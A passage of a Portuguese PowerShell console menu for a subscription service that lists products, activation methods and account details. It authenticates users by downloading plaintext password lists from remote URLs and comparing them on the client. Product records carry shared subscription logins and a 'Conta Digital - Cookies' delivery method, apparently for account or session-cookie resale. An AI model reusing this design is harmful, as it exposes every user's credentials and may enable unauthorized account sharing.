                                Write-Host -NoNewline "     [R] - "  -ForegroundColor Green
                                Write-Host "Renovar Plano Assinatura" -ForegroundColor Gray
                            } else {
                                Write-Host ""
                            }
                            Write-Host -NoNewline "     [C] - "  -ForegroundColor Blue
                            Write-Host "Visualizar Senha da Conta" -ForegroundColor Gray
                            Write-Host -NoNewline "     [D] - "  -ForegroundColor Red
                            Write-Host "Deslogar" -ForegroundColor Gray
                            Write-Host -NoNewline "     [M] - "  -ForegroundColor Cyan
                            Write-Host "Menu Principal" -ForegroundColor Gray
                            Write-Host ""
                            Write-Host "     ===============================================================================================================" -ForegroundColor Green
                            Write-Host ""

                        }

                        # Exibe o menu de detalhes do produto
                        Show-Menu-Detalhes-Produto

                        $opcao_categoria = Read-Host "Selecione a letra ou número de sua categoria disponível"

                        # Verificar se a opção é válida
                        $selecionadoValido = $false
            
                        if ($opcao_categoria -eq "C") {

                            $detalheslogin_senhadisplay = $usuario_info["senha"]
                            Show-Menu-Detalhes-Produto -detalheslogin_senhadisplay $detalheslogin_senhadisplay
                            Start-Sleep -Seconds 3
                            $selecionadoValido = $false
                           
                        } elseif ($opcao_categoria -eq "D") {
                            Fazer-Login
                        } elseif ($opcao_categoria -eq "M") {
                            Show-Menu
                        } elseif ($opcao_categoria -eq "R" -and $data_atual -gt $data_termino -and $produtosComMetodoEspecifico) {
                            MostrarCabecalhoRenovacao
                            MostrarMenuRenovacao -silent -produtosComMetodoEspecifico $produtosComMetodoEspecifico
                        } elseif ($opcao_categoria -match '^\d+$' -and [int]$opcao_categoria -le $todasCategorias.Count) {
                            # Chamar a função Mostrar-Detalhes-Produto com o programa selecionado como parâmetro
                            $categoria_escolhida = $todasCategorias[[int]$opcao_categoria - 1]
                            Write-Host ""
                            Write-Host "Você selecionou a categoria: $categoria_escolhida" -ForegroundColor Green
                            Write-Host ""
                            Show-Produtos-Categoria -UsuarioAtual $usuario_atual -SenhaAtual $senha_atual -CategoriaEscolhida $categoria_escolhida -CategoriasDisponiveis $categoriasDisponiveis -TipoPlanoConta $usuario_info["tipo_plano"] -DataAtual $data_atual -DataTermino $data_termino -ProdutosMetodoLiberado $produtosComMetodoEspecifico
                            # Show-Detail-Produto -CategoriaEscolhida $categoria_escolhida -ProdutosDisponiveis $categorias[$categoria_escolhida] -UsuarioAtual $usuario_atual
                        } else {

                            Write-Host ""
                            Write-Host "Opção inválida. Por favor, digite um número ou letra que seja válido." -ForegroundColor Red
                            Write-Host ""
                            $selecionadoValido = $false
                            # Se nenhuma opção válida for selecionada, mostra o menu atual novamente
                            # Show-Menu-Produto
                        }

                    } while (-not $selecionadoValido)

            } else {

                Write-Host "Usuário não encontrado." -ForegroundColor Red
            
            }
          
       }
}

function Get-Todas-Categorias-Produtos {

    # URLs para obter todos os produtos de diferentes categorias
    $urlsProdutos = Get-Todos-Produtos

    # Inicializar o conjunto de categorias
    $categoriasProdutos = @{}

    foreach ($url_produto in $urlsProdutos) {
        try {
            # Obter o conteúdo do arquivo
            $conteudo = Invoke-RestMethod -Uri $url_produto -ErrorAction Stop
        } catch {
            Write-Host "Erro ao acessar a URL: $url_produto" -ForegroundColor Red
            continue
        }

        # Verificar se o conteúdo está vazio
        #if ([string]::IsNullOrWhiteSpace($conteudo)) {
            #Write-Host "Conteúdo da URL $url_produto está vazio ou não pôde ser obtido." -ForegroundColor Yellow
            #continue
        #}

        # Dividir o conteúdo em linhas
        $produtos = $conteudo -split "`n"

        # Obter categorias
        foreach ($produto in $produtos) {
            $campos = $produto -split "\|"
            if ($campos.Count -gt 1) {
                
                $categoriaProduto = $campos[1].Trim()

                # Verificar se a categoria já existe no dicionário
                if (-not $categoriasProdutos.ContainsKey($categoriaProduto)) {
                    $categoriasProdutos[$categoriaProduto] = @()
                }
                    
                # Adicionar o produto à categoria correspondente
                $categoriasProdutos[$categoriaProduto] += $campos[2].Trim()
          
            }
        }
    }

    return $categoriasProdutos
}

function Get-Todas-Categorias {

    # URLs para obter todos os produtos de diferentes categorias
    $urlsProdutos = Get-Todos-Produtos

    # Inicializar o conjunto de categorias como um array
    $categorias = @()

    foreach ($url_produto in $urlsProdutos) {
        try {
            # Obter o conteúdo do arquivo
            $conteudo = Invoke-RestMethod -Uri $url_produto -ErrorAction Stop
        } catch {
            Write-Host "Erro ao acessar a URL: $url_produto" -ForegroundColor Red
            continue
        }

        # Verificar se o conteúdo está vazio
        #if ([string]::IsNullOrWhiteSpace($conteudo)) {
            #Write-Host "Conteúdo da URL $url_produto está vazio ou não pôde ser obtido." -ForegroundColor Yellow
            #continue
        #}

        # Dividir o conteúdo em linhas
        $produtos = $conteudo -split "`n"

        # Obter categorias
        foreach ($produto in $produtos) {
            $campos = $produto -split "\|"
            if ($campos.Count -gt 1) {
                $categoriaProduto = $campos[1].Trim()
                if ($categoriaProduto -notin $categorias) {
                    $categorias += $categoriaProduto
                }
            }
        }
    }

    return $categorias
}

function Show-Produtos-Categoria {

    param (
        [string]$UsuarioAtual,
        [string]$SenhaAtual,
        [string]$CategoriaEscolhida,
        [string]$TipoPlanoConta,
        [hashtable]$CategoriasDisponiveis,
        [DateTime]$DataAtual,
        [DateTime]$DataTermino,
        [hashtable[]]$ProdutosMetodoLiberado
    )

    $produtosDisponiveis = $CategoriasDisponiveis[$CategoriaEscolhida] | Sort-Object

    # Obter todos os produtos da categoria dos links externos
    $urlsProdutos = Get-Todos-Produtos

    $todosProdutosCategoria = @()
    foreach ($url in $urlsProdutos) {
        try {
            $conteudo = Invoke-RestMethod -Uri $url -ErrorAction Stop
            $produtos = $conteudo -split "`n"
            foreach ($produto in $produtos) {
                $campos = $produto -split "\|"
                if ($campos[1] -eq $CategoriaEscolhida ) {
                    $todosProdutosCategoria += $campos[2]
                }
            }
        } catch {
            Write-Host "Erro ao acessar a URL: $url" -ForegroundColor Red
        }
    }

    # Remover produtos disponíveis da lista de todos os produtos
    $produtosNaoDisponiveis = $todosProdutosCategoria | Sort-Object | Select-Object -Unique |  Where-Object { $_ -notin $produtosDisponiveis }

    # Combinar os produtos disponíveis e não disponíveis em uma lista única
    $todosProdutos = $produtosDisponiveis + $produtosNaoDisponiveis

    do {

        function Show-Menu-Produtos-Disponiveis {
            
            param (
                [string]$detalheslogin_senhadisplay = "***-***-***"
            )

            # Atualiza e carrega todos valores de qtdv
            $qtdvValues = Load-QTDVValues

            # Atualizar qtdv_valor_inicial se necessário
            if ($qtdvValues["qtdv_valor_inicial"] -ne $qtdvTotal) {

                $qtdvValues["qtdv_valor_inicial"] = $qtdvTotal
                    
                if ($qtdvValues["qtdv_valor_atual"] -eq 0) {
                    $qtdvValues["qtdv_valor_atual"] = $qtdvTotal
                }
            }

            cls
            Write-Host ""
            Write-Host "     ===============================================================================================================" -ForegroundColor Green
            Write-Host "                                           MENU DE SELEÇÃO DO PRODUTO CATEGORIA                                     " -ForegroundColor Cyan
            Write-Host "     ===============================================================================================================" -ForegroundColor Green
            Write-Host ""
                                           
            Show-Menu-Detalhes-Login -UsuarioAtual $UsuarioAtual -SenhaAtual $SenhaAtual -TipoPlanoConta $TipoPlanoConta -detalheslogin_senhadisplay $detalheslogin_senhadisplay -qtdvTotal $qtdvValues["qtdv_valor_atual"] -qtdvUtilizado $qtdvValues["qtdv_valor_utilizado"]
            
            # Calcular quantidades de produtos
            $quantidade_produtos_total = $todosProdutos.Count
            $quantidade_produtos_disponiveis = $produtosDisponiveis.Count
            
            Write-Host ""
            Write-Host "     ===============================================================================================================" -ForegroundColor Green
            Write-Host ""
            Write-Host "      DETALHES DE PRODUTOS: " -ForegroundColor Cyan
            Write-Host ""
                    Write-Host -NoNewline "      CATEGORIA SELECIONADA: "
                    #$nomeCategoria = $CategoriaEscolhida.ToUpper()
                    Write-Host "$CategoriaEscolhida" -ForegroundColor Yellow
                    Write-Host -NoNewline "      QTD PRODUTOS DISPONÍVEIS: "
                    Write-Host "$quantidade_produtos_disponiveis" -ForegroundColor Yellow
                    Write-Host -NoNewline "      QTD TOTAL DE PRODUTOS: "
                    Write-Host "$quantidade_produtos_total" -ForegroundColor Yellow
            Write-Host ""
            Write-Host "     ===============================================================================================================" -ForegroundColor Green
            Write-Host ""

            # Exibir o menu de produtos com numeração
            $contador = 1
            foreach ($produto in $todosProdutos) {
                if ($produtosDisponiveis -contains $produto) {
                    Write-Host "     [$contador] - $produto" -ForegroundColor Green
                } else {
                    Write-Host "     [$contador] - $produto" -ForegroundColor DarkGray
                }
                $contador++
            }
            Write-Host " "
            Write-Host -NoNewline "     [C] - "  -ForegroundColor Blue
            Write-Host "Visualizar Senha da Conta" -ForegroundColor Gray
            Write-Host -NoNewline "     [D] - "  -ForegroundColor Red
            Write-Host "Deslogar" -ForegroundColor Gray
            Write-Host -NoNewline "     [V] - "  -ForegroundColor Cyan
            Write-Host "Voltar" -ForegroundColor Gray
            Write-Host -NoNewline "     [M] - "  -ForegroundColor Yellow
            Write-Host "Menu Principal" -ForegroundColor Gray
            Write-Host ""
            Write-Host "     ===============================================================================================================" -ForegroundColor Green
            Write-Host ""
        }
        
        # Exibe o menu de detalhes de produtos disponíveis
        Show-Menu-Produtos-Disponiveis

        # Ler a seleção do usuário
        $opcao_produto = Read-Host "Selecione a letra ou número do seu produto disponível"
        
        # Verificar se a opção é válida
        $selecionadoValido = $false

        # Verificar se a opção é válida
        if ($opcao_produto -match '^\d+$' -and $opcao_produto -ge 1 -and $opcao_produto - 1 -le $todosProdutos.Count) {
            $produtoSelecionado = $todosProdutos[$opcao_produto - 1]
            if ($produtosDisponiveis -contains $produtoSelecionado) {
                Write-Host ""
                Write-Host "Você selecionou o produto: $produtoSelecionado" -ForegroundColor Green
                Write-Host ""
                # Aqui você pode adicionar a lógica para manipular a seleção do produto disponível
                Show-Produtos-Metodos -UsuarioAtual $usuario_atual -SenhaAtual $senha_atual -CategoriaEscolhida $CategoriaEscolhida -ProdutoSelecionado $produtoSelecionado -TipoPlanoConta $TipoPlanoConta -DataAtual $DataAtual -DataTermino $DataTermino -ProdutosMetodoLiberado $ProdutosMetodoLiberado
                $selecionadoValido = $true
            } else {
                Write-Host ""
                Write-Host "Produto não disponível para seleção." -ForegroundColor Red
                Start-Sleep -Seconds 1
                $selecionadoValido = $false
            }
        } elseif ($opcao_produto -eq "C") {
            $detalheslogin_senhadisplay = $SenhaAtual
            Show-Menu-Produtos-Disponiveis -detalheslogin_senhadisplay $detalheslogin_senhadisplay
            Start-Sleep -Seconds 3
            $selecionadoValido = $false
        } elseif ($opcao_produto -eq "D") {
            Fazer-Login
        } elseif ($opcao_produto -eq "V") {
            Show-Menu-Produto
        } elseif ($opcao_produto -eq "M") {
            Show-Menu
        } else {
            Write-Host ""
            Write-Host "Opção inválida. Por favor, digite um número ou letra que seja válido." -ForegroundColor Red
            Write-Host ""
            $selecionadoValido = $false
        }

    } while (-not $selecionadoValido)

}

function Show-Produtos-Metodos {

    param (
        [string]$UsuarioAtual,
        [string]$SenhaAtual,
        [string]$ProdutoSelecionado,
        [string]$CategoriaEscolhida,
        [string]$TipoPlanoConta,
        [DateTime]$DataAtual,
        [DateTime]$DataTermino,
        [hashtable[]]$ProdutosMetodoLiberado
    )

    do {

        # Obter o conteúdo de todos usuários através de urls
        $urls = Get-Todos-Usuarios

        # Variáveis para armazenar as informações do usuário
        $usuario_info = $null

        foreach ($url in $urls) {
            try {
                # Obter o conteúdo do arquivo
                $conteudo = Invoke-RestMethod -Uri $url -ErrorAction Stop
            } catch {
                Write-Host "Erro ao acessar a URL: $url" -ForegroundColor Red
                continue
            }
        
            # Verificar se o conteúdo está vazio
            if ([string]::IsNullOrWhiteSpace($conteudo)) {
                Write-Host "Conteúdo da URL $url está vazio ou não pôde ser obtido." -ForegroundColor Yellow
                continue
            }

            # Encontrar os programas disponíveis para o usuário atual
            $usuario_atual = $UsuarioAtual
            $senha_atual = $SenhaAtual

            $linhas = $conteudo -split "`n"

            foreach ($linha in $linhas) {

                $campos = $linha -split "\|"
                
                # Verificar se há pelo menos dois campos
                if ($campos.Count -ge 3) {

                    $usuario_atual_arquivo = $campos[1].Trim()
                    $senha_atual_arquivo = $campos[2].Trim()

                    if ($usuario_atual -eq $usuario_atual_arquivo -and $senha_atual -eq $senha_atual_arquivo) {
                        # Usuário encontrado, armazenar informações
                        $usuario_info = @{
                            "id" = $campos[0].Trim()
                            "usuario" = $campos[1].Trim()
                            "senha" = $campos[2].Trim()
                            "produtos" = $campos[3].Trim()
                            "duracao_plano" = $campos[4].Trim()
                            "data_inicio" = $campos[5].Trim()
                            "data_termino" = $campos[6].Trim()
                            "status_pagamento" = $campos[7].Trim()
                            "tipo_plano" = $campos[8].Trim()
                        }
                        break
                    }
                }
            }

            # Se o usuário foi encontrado, não precisa verificar outros links
            if ($usuario_info) {
                break
            }
        }

                if ($usuario_info) {

                    # Analisar produtos e agrupar por método
                    
                    $produtos = $usuario_info["produtos"] -split ":"
                    $tipo_plano_usuario = $usuario_info["tipo_plano"]
                    
                    $metodosDisponiveis = @{}
                    
                    foreach ($produto in $produtos) {

                        $detalhes_produto = $produto -split ","

                        $nome_usuario_produto = $detalhes_produto[0].Trim()
                        $metodo_ativacao_usuario = $detalhes_produto[2].Trim()

                        if ($tipo_plano_usuario -ne "VIP") {

                            if ($nome_usuario_produto -eq $produtoSelecionado) {
                                
                                if (-not $metodosDisponiveis.ContainsKey($metodo_ativacao_usuario)) {
                                    $metodosDisponiveis[$metodo_ativacao_usuario] = @()
                                }

                                if (-not ($metodosDisponiveis[$metodo_ativacao_usuario] -contains $nome_usuario_produto)) {
                                    $metodosDisponiveis[$metodo_ativacao_usuario] += $nome_usuario_produto
                                }
            
                            }

                        } else {

                            # URLs para obter todos os produtos de diferentes categorias
                            $urlsProdutos = Get-Todos-Produtos

                            foreach ($urlsProduto in $urlsProdutos) {
                                try {
                                    # Obter o conteúdo do arquivo
                                    $conteudoProdutoDisponivel = Invoke-RestMethod -Uri $urlsProduto -ErrorAction Stop
                                } catch {
                                    Write-Host "Erro ao acessar a URL: $urlsProduto" -ForegroundColor Red
                                    continue
                                }

                                # Dividir o conteúdo em linhas
                                $produtosDisponveis = $conteudoProdutoDisponivel -split "`n"

                                foreach ($produtoDisponivel in $produtosDisponveis) {

                                    $detalhes_produto_disponivel = $produtoDisponivel -split "\|"

                                    if ($detalhes_produto_disponivel.Count -gt 1) {
                
                                        $categoria_produto = $detalhes_produto_disponivel[1].Trim()
                                        $nome_produto = $detalhes_produto_disponivel[2].Trim()
                                        $metodo_ativacao_produto = $detalhes_produto_disponivel[3].Trim()

                                        # Função auxiliar para adicionar produtos a $metodosDisponiveis
                                        function AddToMetodosDisponiveis($key, $produto) {
                                            if (-not $metodosDisponiveis.ContainsKey($key)) {
                                                $metodosDisponiveis[$key] = @()
                                            }
                                            if (-not ($metodosDisponiveis[$key] -contains $produto)) {
                                                $metodosDisponiveis[$key] += $produto
                                            }
                                        }

                                        if ($categoria_produto -eq $CategoriaEscolhida -and $metodo_ativacao_produto -eq "Pré-Ativado") {
                                            

                                            if ($nome_usuario_produto -eq $produtoSelecionado) {
                                                AddToMetodosDisponiveis $metodo_ativacao_usuario $nome_usuario_produto
                                            } elseif ($DataAtual -le $DataTermino -or -not $ProdutosMetodoLiberado) {
                                                if ($nome_produto -eq $ProdutoSelecionado) {
                                                    AddToMetodosDisponiveis $metodo_ativacao_produto $nome_produto
                                                }
                                            }

                                        } elseif ($categoria_produto -eq $CategoriaEscolhida -and $metodo_ativacao_produto -eq "Conta Digital - Pública") {
                                            

                                            if ($nome_usuario_produto -eq $produtoSelecionado) {
                                                AddToMetodosDisponiveis $metodo_ativacao_usuario $nome_usuario_produto
                                            } elseif ($DataAtual -le $DataTermino -or -not $ProdutosMetodoLiberado) {
                                                if ($nome_produto -eq $ProdutoSelecionado) {
                                                    AddToMetodosDisponiveis $metodo_ativacao_produto $nome_produto
                                                }
                                            }

                                        } elseif ($categoria_produto -eq $CategoriaEscolhida -and $metodo_ativacao_produto -eq "Conta Digital - Cookies") {
                                            

                                            if ($nome_usuario_produto -eq $produtoSelecionado) {
                                                AddToMetodosDisponiveis $metodo_ativacao_usuario $nome_usuario_produto
                                            } elseif ($DataAtual -le $DataTermino -or -not $ProdutosMetodoLiberado) {
                                                if ($nome_produto -eq $ProdutoSelecionado) {
                                                    AddToMetodosDisponiveis $metodo_ativacao_produto $nome_produto
                                                }
                                            }

                                        }
                                        
                                    }
                                }

                            }

                        }
    
                    }

                    # Chamar a função para obter todas os métodos
                    $todosMetodos = Get-Todos-Metodos -CategoriaEscolhida $categoria_escolhida 

                    # Calcular quantidades de métodos
                    $quantidade_metodos_total = $todosMetodos[$categoria_escolhida].Count 
                    $quantidade_metodos_disponiveis = $metodosDisponiveis.Keys.Count

                } else {

                    Write-Host "Usuário não encontrado." -ForegroundColor Red
            
                }


                function Show-Menu-Metodos-Produtos {
                    param (
                        [string]$detalheslogin_senhadisplay = "***-***-***"
                    )

                    # Atualiza e carrega todos valores de qtdv
                    $qtdvValues = Load-QTDVValues

                    # Atualizar qtdv_valor_inicial se necessário
                    if ($qtdvValues["qtdv_valor_inicial"] -ne $qtdvTotal) {

                        $qtdvValues["qtdv_valor_inicial"] = $qtdvTotal
                    
                        if ($qtdvValues["qtdv_valor_atual"] -eq 0) {
                            $qtdvValues["qtdv_valor_atual"] = $qtdvTotal
                        }
                    }

                    cls
                    Write-Host ""
                    Write-Host "     ===============================================================================================================" -ForegroundColor Green
                    Write-Host "                                              MENU DE SELEÇÃO MÉTODOS PRODUTO                                       " -ForegroundColor Cyan
                    Write-Host "     ===============================================================================================================" -ForegroundColor Green
                    Write-Host ""
                    
                    Show-Menu-Detalhes-Login -UsuarioAtual $UsuarioAtual -SenhaAtual $SenhaAtual -TipoPlanoConta $TipoPlanoConta -detalheslogin_senhadisplay $detalheslogin_senhadisplay -qtdvTotal $qtdvValues["qtdv_valor_atual"] -qtdvUtilizado $qtdvValues["qtdv_valor_utilizado"]
                    
                    Write-Host ""
                    Write-Host "     ===============================================================================================================" -ForegroundColor Green
                    Write-Host ""
                    Write-Host "      DETALHES MÉTODO DE ATIVAÇÃO: " -ForegroundColor Cyan
                    Write-Host ""
                            Write-Host -NoNewline "      CATEGORIA SELECIONADA: "
                            Write-Host "$CategoriaEscolhida" -ForegroundColor Yellow
                            Write-Host -NoNewline "      PRODUTO SELECIONADO: "
                            Write-Host "$ProdutoSelecionado" -ForegroundColor Yellow
                            Write-Host -NoNewline "      QTD MÉTODOS DISPONÍVEIS: "
                            Write-Host "$quantidade_metodos_disponiveis" -ForegroundColor Yellow
                            Write-Host -NoNewline "      QTD TOTAL MÉTODOS: "
                            Write-Host "$quantidade_metodos_total" -ForegroundColor Yellow
                    Write-Host ""
                    Write-Host "     ===============================================================================================================" -ForegroundColor Green
                    Write-Host ""

                    # Exibir categorias e quantidade de produtos
                    $contador = 1

                    foreach ($metodo_categoria in $todosMetodos[$categoria_escolhida]) {
                        
                        $produtos_metodos_disponiveis = if ($metodosDisponiveis.ContainsKey($metodo_categoria)) { $metodosDisponiveis[$metodo_categoria] } else { @() }

                        # Definir cores com base na disponibilidade dos métodos
                        if ($produtos_metodos_disponiveis -gt 1) {
                            Write-Host "     [$contador] - $metodo_categoria" -ForegroundColor Yellow
                        } else {
                            Write-Host "     [$contador] - $metodo_categoria" -ForegroundColor DarkGray
                        }

                        $contador++
                       
                    }

                    Write-Host ""
                    Write-Host -NoNewline "     [C] - "  -ForegroundColor Blue
                    Write-Host "Visualizar Senha da Conta" -ForegroundColor Gray
                    Write-Host -NoNewline "     [D] - "  -ForegroundColor Red
                    Write-Host "Deslogar" -ForegroundColor Gray
                    Write-Host -NoNewline "     [V] - "  -ForegroundColor Cyan
                    Write-Host "Voltar" -ForegroundColor Gray
                    Write-Host -NoNewline "     [M] - "  -ForegroundColor Yellow
                    Write-Host "Menu Principal" -ForegroundColor Gray
                    Write-Host ""
                    Write-Host "     ===============================================================================================================" -ForegroundColor Green
                    Write-Host ""
                        
                }

                # Exibe o menu de detalhes de metodos dos produtos
                Show-Menu-Metodos-Produtos

                $opcao_metodo = Read-Host "Selecione a letra ou número do método disponível para seu $ProdutoSelecionado"
                
                # Verificar se a opção é válida
                $selecionadoValido = $false

                if ($opcao_metodo -match '^\d+$' -and [int]$opcao_metodo -ge 1 -and [int]$opcao_metodo -le $todosMetodos[$categoria_escolhida].Count) {
                    # Chamar a função Mostrar-Detalhes-Produto com o produto selecionado como parâmetro
                    $metodo_escolhido = $todosMetodos[$categoria_escolhida][$opcao_metodo - 1]
                    if ($metodosDisponiveis.Keys -contains $metodo_escolhido) {
                        Write-Host ""
                        Write-Host "Você selecionou o método: $metodo_escolhido" -ForegroundColor Green 
                        Write-Host ""
                        # Aqui você pode adicionar a lógica para manipular a seleção do produto disponível
                        Show-Detail-Produto-Geral -UsuarioAtual $usuario_atual -SenhaAtual $senha_atual -CategoriaEscolhida $CategoriaEscolhida -ProdutoSelecionado $produtoSelecionado -MetodoSelecionado $metodo_escolhido -TipoPlanoConta $TipoPlanoConta -DataAtual $DataAtual -DataTermino $DataTermino -ProdutosMetodoLiberado $ProdutosMetodoLiberado
                        $selecionadoValido = $true 
                    } else {
                        Write-Host ""
                        Write-Host "Método não disponível para o seu $ProdutoSelecionado" -ForegroundColor Red
                        Write-Host ""
                        Start-Sleep -Seconds 1
                        $selecionadoValido = $false
                        # Se nenhuma opção válida for selecionada, mostra o menu atual novamente
                    }
                } elseif ($opcao_metodo -eq "C") {
                    
                    $detalheslogin_senhadisplay = $usuario_info["senha"]
                    Show-Menu-Metodos-Produtos -detalheslogin_senhadisplay $detalheslogin_senhadisplay
                    Start-Sleep -Seconds 3
                    $selecionadoValido = $false

                } elseif ($opcao_metodo -eq "D") {
                    Fazer-Login
                } elseif ($opcao_metodo -eq "V") {
                    Show-Produtos-Categoria -UsuarioAtual $usuario_atual -SenhaAtual $senha_atual -CategoriaEscolhida $categoria_escolhida -CategoriasDisponiveis $categoriasDisponiveis -TipoPlanoConta $usuario_info["tipo_plano"] -DataAtual $DataAtual -DataTermino $DataTermino -ProdutosMetodoLiberado $ProdutosMetodoLiberado
                } elseif ($opcao_metodo -eq "M") {
                    Show-Menu
                } else {
                    Write-Host ""
                    Write-Host "Opção inválida. Por favor, digite um número válido." -ForegroundColor Red
                    Write-Host ""
                    $selecionadoValido = $false
                    # Se nenhuma opção válida for selecionada, mostra o menu atual novamente
                    # Show-Produtos-Metodos -UsuarioAtual $usuario_atual -SenhaAtual $senha_atual -ProdutoSelecionado $produtoSelecionado
                }

                # Aqui você pode adicionar a lógica para lidar com a opção selecionada
                # pause

    } while (-not $selecionadoValido)
}

function Get-Todos-Metodos {

    param (
        [string]$CategoriaEscolhida
    )

    # URLs para obter todos os produtos com diferentes metodos
    $urlsMetodos = Get-Todos-Produtos

    # Inicializar o conjunto de metodos como um array
    $metodosPorCategoria = @{}

    foreach ($url_metodo in $urlsMetodos) {
        try {
            # Obter o conteúdo do arquivo
            $conteudo = Invoke-RestMethod -Uri $url_metodo -ErrorAction Stop
        } catch {
            Write-Host "Erro ao acessar a URL: $url_metodo" -ForegroundColor Red
            continue
        }

        # Verificar se o conteúdo está vazio
        #if ([string]::IsNullOrWhiteSpace($conteudo)) {
            #Write-Host "Conteúdo da URL $url_produto está vazio ou não pôde ser obtido." -ForegroundColor Yellow
            #continue
        #}

        # Dividir o conteúdo em linhas
        $produtos = $conteudo -split "`n"

        # Obter metodos
        foreach ($produto in $produtos) {
            
            $campos = $produto -split "\|"
            
            if ($campos.Count -gt 3) {
                
                $categoriaProduto = $campos[1].Trim()
                $metodoProduto = $campos[3].Trim()

                if (-not $metodosPorCategoria.ContainsKey($categoriaProduto)) {
                    $metodosPorCategoria[$categoriaProduto] = @()
                }

                if ($metodoProduto -notin $metodosPorCategoria[$categoriaProduto]) {
                    $metodosPorCategoria[$categoriaProduto] += $metodoProduto
                }
            }
        }
    }

    return $metodosPorCategoria

}

function Show-Detail-Produto-Geral {

    param (
        [string]$UsuarioAtual,
        [string]$SenhaAtual,
        [string]$CategoriaEscolhida,
        [string]$ProdutoSelecionado,
        [string]$MetodoSelecionado,
        [string]$TipoPlanoConta,
        [DateTime]$DataAtual,
        [DateTime]$DataTermino,
        [hashtable[]]$ProdutosMetodoLiberado
    )

    do {

        # URLs para obter todos os usuarios nas urls
        $urls_usuario = Get-Todos-Usuarios

        # Obter todos os produtos de diferentes métodos ativação nas urls
        $urls_produto = Get-Todos-Produtos

        # Variáveis para armazenar as informações do usuário
        $usuario_info = $null

        # Variáveis para armazenar as informações do produto softwares método digital do usuário
        $produto_digital_softwares_info = $null
        # Variáveis para armazenar as informações do produto softwares método chaveserial do usuário
        $produto_chaveserial_softwares_info = $null
        # Variáveis para armazenar as informações do produto streaming método digital do usuário
        $produto_digital_streaming_info = $null
        # Variáveis para armazenar as informações do produto vpns método digital do usuário
        $produto_digital_vpns_info = $null

        foreach ($url in $urls_produto) {
            try {
                # Obter o conteúdo do arquivo
                $conteudo_produto = Invoke-RestMethod -Uri $url -ErrorAction Stop
            } catch {
                Write-Host "Erro ao acessar a URL: $url" -ForegroundColor Red
                continue
            }
            
            # Verificar se o conteúdo está vazio
            #if ([string]::IsNullOrWhiteSpace($conteudo_produto)) {
                #Write-Host "Conteúdo da URL $url está vazio ou não pôde ser obtido." -ForegroundColor Yellow
                #continue
            #}

            # Encontrar os produtos disponíveis do usuário atual
            
            $usuario_atual = $UsuarioAtual
            $senha_atual = $SenhaAtual
            $categoria_atual = $CategoriaEscolhida
            $produto_atual = $ProdutoSelecionado
            $metodo_atual = $MetodoSelecionado
            $plano_conta_atual = $TipoPlanoConta

            $linhas = $conteudo_produto -split "`n"

            foreach ($linha in $linhas) {
                
                $campos = $linha -split "\|"

                # Verificar se há pelo menos dois campos
                if ($campos.Count -ge 2) {
                    
                    $categoria_atual_produto = $campos[1].Trim()
                    $nome_atual_produto = $campos[2].Trim()
                    $metodo_atual_produto = $campos[3].Trim()
                    $usuario_atual_produto = $campos[4].Trim()
                    $senha_atual_produto = $campos[5].Trim()


                    if ($usuario_atual -eq $usuario_atual_produto -and $senha_atual -eq $senha_atual_produto -and $metodo_atual -eq $metodo_atual_produto) {

                       if($categoria_atual_produto -eq "Softwares e Licenças" -and $nome_atual_produto -eq $produto_atual -and $metodo_atual_produto -eq "Conta Digital") {

                           # Produto encontrado, armazenar informações
                           $produto_digital_softwares_info = @{
                                "id" = $campos[0].Trim()
                                "categoria_produto" = $campos[1].Trim()
                                "nome_produto" = $campos[2].Trim()
                                "metodo_ativacao" = $campos[3].Trim()
                                "usuario_atual_produto" = $campos[4].Trim()
                                "senha_atual_produto" = $campos[5].Trim()
                                "ano_produto" = $campos[6].Trim()
                                "versao_atual" = $campos[7].Trim()
                                "versao_disponivel" = $campos[8].Trim()
                                "sistema_operacional" = $campos[9].Trim()
                                "compatibilidade_dispositivos" = $campos[10].Trim()
                                "duracao_plano" = $campos[11].Trim()
                                "tipo_conta" = $campos[12].Trim()
                                "detalhes_adicionais" = $campos[13].Trim()
                                "instrucoes_usoativacao" = $campos[14].Trim()
                                "capacidade_armazenamento" = $campos[15].Trim()
                                "qtd_acessusuarios_simult" = $campos[16].Trim()
                                "qtd_acessdisp_simult" = $campos[17].Trim()
                                "regras_uso" = $campos[18].Trim()
                                "dias_garantia_suporte" = $campos[19].Trim()
                                "status_renovacao" = $campos[20].Trim()
                                "link_assinatura" = $campos[21].Trim()
                                "link_codigo_ativacao" = $campos[22].Trim()
                                "link_tutorial_ativacao" = $campos[23].Trim()
                                "usuario_assinatura" = $campos[24].Trim()
                                "senha_assinatura" = $campos[25].Trim()
                                "link_imagemprintconta" = $campos[26].Trim()
                                "tempo_espera_entrega" = $campos[27].Trim()
                                "status_disponibilidade_entrega" = $campos[28].Trim()
                                "disponibilidade_produto" = $campos[29].Trim()
                           }

                           break 

                       } elseif ($categoria_atual_produto -eq "Softwares e Licenças" -and $nome_atual_produto -eq $produto_atual -and $metodo_atual_produto -eq "Chave/Serial") {

                           # Produto encontrado, armazenar informações
                           $produto_chaveserial_softwares_info = @{
                                "id" = $campos[0].Trim()
                                "categoria_produto" = $campos[1].Trim()
                                "nome_produto" = $campos[2].Trim()
                                "metodo_ativacao" = $campos[3].Trim()
                                "usuario_atual_produto" = $campos[4].Trim()
                                "senha_atual_produto" = $campos[5].Trim()
                                "ano_produto" = $campos[6].Trim()
                                "versao_atual" = $campos[7].Trim()
                                "versao_disponivel" = $campos[8].Trim()
                                "sistema_operacional" = $campos[9].Trim()
                                "compatibilidade_dispositivos" = $campos[10].Trim()
                                "duracao_plano" = $campos[11].Trim()
                                "tipo_conta" = $campos[12].Trim()
                                "detalhes_adicionais" = $campos[13].Trim()
                                "instrucoes_usoativacao" = $campos[14].Trim()
                                "capacidade_armazenamento" = $campos[15].Trim()
                                "qtd_acessusuarios_simult" = $campos[16].Trim()
                                "qtd_acessdisp_simult" = $campos[17].Trim()
                                "regras_uso" = $campos[18].Trim()
                                "dias_garantia_suporte" = $campos[19].Trim()
                                "status_renovacao" = $campos[20].Trim()
                                "processos_produto" = $campos[21].Trim()
                                "links_produto" = $campos[22].Trim()
                                "localizacao_produto" = $campos[23].Trim()
                                "link_codigo_ativacao" = $campos[24].Trim()
                                "link_tutorial_ativacao" = $campos[25].Trim()
                                "usuario_assinatura" = $campos[26].Trim()
                                "senha_assinatura" = $campos[27].Trim()
                                "chave_key" = $campos[28].Trim()
                                "link_imagemprintconta" = $campos[29].Trim()
                                "tempo_espera_entrega" = $campos[30].Trim()
                                "status_disponibilidade_entrega" = $campos[31].Trim()
                                "disponibilidade_produto" = $campos[32].Trim()
                            }

                            break
                        
